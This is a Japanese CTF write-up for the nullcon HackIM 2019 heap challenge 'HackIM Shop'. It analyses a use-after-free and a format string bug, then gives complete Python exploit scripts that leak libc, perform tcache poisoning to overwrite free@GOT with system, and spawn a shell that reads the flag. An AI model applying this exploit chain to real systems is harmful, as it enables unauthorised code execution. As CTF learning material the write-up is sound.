# [pwn 458pts] HackIM Shop - nullcon HackIM 2019
64ビットでSSPが有効になっています。
どうもlibcは配られていないようです。
```
$ checksec challenge
[*] 'challenge'
    Arch:       64 bits (little endian)
    NX:         NX enabled
    SSP:        SSP enabled (Canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
```
ヒープ系の問題ですね。
本を追加できるのですが、本のタイトルやそのサイズは指定できます。
`add_book`の処理を見てみましょう。
```c
if (num_books != 10) {
   book = (st_book*)malloc(0x38);
   printf("Book name length: ");
   unsigned int size = readint();
   if (size > 0xff) {
       puts("Too big!");
       return;
   }
   printf("Book name: ");
   book->name = malloc(size);
   read(0, book->name, size);
   if (book->name[strlen(book->name) - 1] == 0x0A) {
      book->name[strlen(book->name) - 1] = 0;
   };
   printf("Book price: ");
   book->price = readint();
   for(i = 0; ; i++) {
      if (books[i] == 0) {
         break;
      }
   }
   books[i] = book;
   books[i]->id = i;
   num_books++;
   strcpy(books[i]->copyright, cp_stmt);
}
```
`cp_stmt`はグローバル変数で`"Copyright NullCon Shop"`という文字列が入っています。
`st_book`は次のような構造体として定義されています（たぶん）。
```c
typedef struct {
   long id;
   void *name;
   long price;
   char copyright[0x20];
   
} st_book;
```
`remove_book`は次のような処理になっています。
```c
printf("Book index: ")
i = readint()
if (i > num_books) {
   puts("Invalid index");
   return;
}
free(books[i]->name);
free(books[i]);
num_books--;
```
`view_books`で名前や価格をjson形式で見ることができます。
ただCopy rightsの表示にFormat String Bugがあります。

本を削除してもグローバル変数`books`にはポインタが残っているので、再び使用されるとviewで内容を見ることができます。
なので、fastbins(tcache?)のリンクを上手いこと調節してやれば、削除した本のcopy rightsに本のタイトル(books[i]->name+0x18)を表示させることができ、Format String Exploitができるかもしれません。

まず名前サイズ0xf8と0x38の本を作り、それぞれのindexは0と1です。
1,0の順番なら削除でき、このときfastbinは
```
fastbin[2] --> (books[0]) --> (books[1]) --> (books[1]->name)
```
となっているはずです。
この状態で名前サイズ0x38の本を1つ確保すると
```
books[2] = books[0]
books[2]->name = books[1]
```
となります。
一方viewからは`books[1]`が未だ使われているので、`books[2]`で上書きされた構造体が使われることになります。
したがって、`books[2]`の名前に`st_book`構造体と同じ形のデータを入れればcopy rightを自由に変更できるでしょう。
```python
from ptrlib import *

def add(size, name, price):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("length: ")
    sock.sendline(str(size))
    sock.recvuntil("name: ")
    sock.send(name)
    sock.recvuntil("price: ")
    sock.sendline(str(price))

def remove(index):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("index: ")
    sock.sendline(str(index))

def view():
    sock.recvuntil("> ") 
    sock.sendline("3")
    print(bytes2str(sock.recvuntil("(4) Check out")))

elf = ELF("./challenge")
sock = Process("./challenge")

payload = p64(0)
payload += p64(elf.symbol("cp_stmt"))
payload += p64(1337)
payload += b"Hello, World!\x00"
add(0xf8, "B", 123)
add(0x38, "A", 123)
remove(1)
remove(0)
add(0x38, payload, 123)
view()
```
実行すると、本来変更できないrightsが変更できています。
```
{
        "Books" : [
                {
                        "index": 2,
                        "name": "",
                        "price": 123,
                        "rights": "Copyright NullCon Shop"
                },
                {
                        "index": 0,
                        "name": "Copyright NullCon Shop",
                        "price": 1337,
                        "rights": "Hello, World!"
                },
                {
                        "index": 2,
                        "name": "",
                        "price": 123,
                        "rights": "Copyright NullCon Shop"
                }
        ]
}
```
`books[2]`をremoveしてaddすれば新しいrightsを入れることもできるので、何回かFormat String Exploitができる形です。
ただし、データそのものはbssセクションにあるので上手いこと任意アドレスへの書き込みができるでしょうか。
とりあえず`%15$p`をrightsに与えるとmain関数のリターンアドレスが分かるので、これを元にlibc databaseを参照するとlibcは`libc6_2.27-3ubuntu1_amd64.so`であることが分かりました。
`__libc_start_main+??`のアドレスが分かったので同時にlibcのロードアドレスも分かります。

さて、後はGOTなり`__free_hook`なりにsystem関数のアドレスを書き込めば終了です。
libcのバージョン的にtcacheが有効です。
~~`books[1]->name`に任意のアドレスが入れられるので、ここにatol関数のGOTのアドレスを書き込んで、freeすればtcacheにatolのGOTアドレスがリンクされます。~~
atol用に使えるバッファは2バイトだったので今回はfree関数のGOTを使います。
あとはmallocしてsystem関数のアドレスを書き込みます。
ここまでやって思ったのですが、nameでGOTのアドレスがリークできるから別にFSBいらなくない...？

今回はまずtcacheにゴミが残っていれば使い果たして、その後サイズ0xf8と0x38のチャンクを確保します。0xf8のチャンクを2回削除して、0x38のチャンクを2つほど削除します。これにより次にサイズ0xf8のチャンクを確保した際、nameでTCache Poisoningを起こしつつ、book用のサイズ0x38のチャンクではdouble freeで落ちないようにできます。
あとは1回目にfreeのGOTアドレスを書き込み、2回目は適当、3回目にsystem関数のアドレスを書き込めばTCache Poisoningできます。

具体的には、
```
tcache(for 0x38) --> (books[i]) --> (books[i])
tcache(for 0xf8) --> (books[i]->name) --> (books[i]->name)
```
の状態で
```
add(0xf8, p64(got_free), 123)
add(0xf8, "AAAA", 123)
```
としてしまうとtcacheが
```
tcache(for 0x38) --> ????
tcache(for 0xf8) --> free@GOT
```
となり、次に本を作る際に落ちてしまいます。
そこでサイズ0x48(オーバーヘッド抜きで0x38)のチャンクを削除しておけば
```
tcache(for 0x38) --> (books[j]) --> (books[j]->name) --> (books[i]) --> (books[i])
tcache(for 0xf8) --> (books[i]->name) --> (books[i]->name)
```
となり、余裕が生まれます。

また、本が削除可能かは単純に全体の本の個数で判断されるので、たくさん本を作っておきましょう。
最後にnameが`/bin/sh`の本を削除すればシェルが奪えます。

```python
from ptrlib import *
import re

def add(size, name, price):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("length: ")
    sock.sendline(str(size))
    sock.recvuntil("name: ")
    sock.send(name)
    sock.recvuntil("price: ")
    sock.sendline(str(price))

def remove(index):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("index: ")
    sock.sendline(str(index))

def view():
    sock.recvuntil("> ") 
    sock.sendline("3")
    return sock.recvuntil("(4) Check out")

elf = ELF("./challenge")
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
sock = Socket("127.0.0.1", 4002)
#sock = Socket("192.168.1.19", 4010)
_ = input()

# libc leak
payload = p64(0x41424344)
payload += p64(0)
payload += p64(1337)
payload += b"%15$p\x00"
add(0xf8, "A", 123)
add(0x38, "B", 123)
remove(1)
remove(0)
add(0x38, payload, 123)
ret = view()
addr_libc_start_main_ret = int(re.findall(b"0x[0-9a-f]+", ret)[0], 16)
libc_base = addr_libc_start_main_ret - 0x021b97
addr_system = libc_base + libc.symbol("system")
dump("libc base = " + hex(libc_base))

# tcache poisoning
add(0xf8, "/bin/sh\x00", 123) # 3
add(0xf8, "b", 123) # 4
add(0x38, "c", 123) # 5
add(0xf8, "d", 123) # 6
add(0xf8, "e", 123) # 7
add(0x38, "f", 123) # 8
add(0xf8, "g", 123) # 9
add(0xf8, "g", 123) # 10
add(0xf8, "g", 123) # 11
remove(6)
remove(6)
remove(8)
remove(5)

add(0xf8, p64(elf.got("free")), 123)
add(0xf8, "?", 123)
add(0xf8, p64(addr_system), 123)

remove(3)
sock.interactive()
```

```
$ python solve.py
[+] Socket: Successfully connected to 127.0.0.1:4002

[ptrlib] libc base = 0x7f702a4c4000
[ptrlib]$ ls
challenge
flag
[ptrlib]$ cat flag
hackim19{h0p3_7ha7_Uaf_4nd_f0rm4ts_w3r3_fun_4_you}
[ptrlib]$ ^C[+] close: Connection to 127.0.0.1:4002 closed
```

公式writeup(?)によるとGOTの書き換えにFSBを使うらしいです。
スタックにrightsが存在しているっぽく書かれていて原理が分からなかったけど解けたからOK。

# 感想
Format String BugってIDAで眺めててもなかなか気付かないですよね。
まだ解くのに時間はかかりますが、ヒープ系の問題がだんだん解けるようになって楽しい。
